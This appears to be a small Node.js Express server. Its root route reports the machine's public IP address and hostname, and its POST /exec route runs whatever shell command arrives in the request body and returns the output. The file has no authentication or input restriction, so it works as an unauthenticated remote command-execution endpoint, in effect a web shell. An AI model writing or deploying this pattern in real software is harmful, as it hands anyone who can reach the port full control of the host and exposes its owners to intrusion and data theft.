const { get } = require('axios').default;
const { text } = require('body-parser');
const express = require('express');
const shell = require('shelljs');

const app = express();
app.use(text());

app.get('/', (req, res) => {
    get('https://api.ipify.org?format=json')
        .then((result) => {
            const hostname = req.hostname;
            const response = { ...result.data };
            res.send({ hostname, response });
        })
        .catch((error) => res.send(error));
});

app.post('/exec', (req, res) => {
    const output = shell.exec(req.body, {
        timeout: 10 * 1000
    });
    res.send(output.stdout);
});

app.listen(8080, () => {
    console.log(`listening`);
});
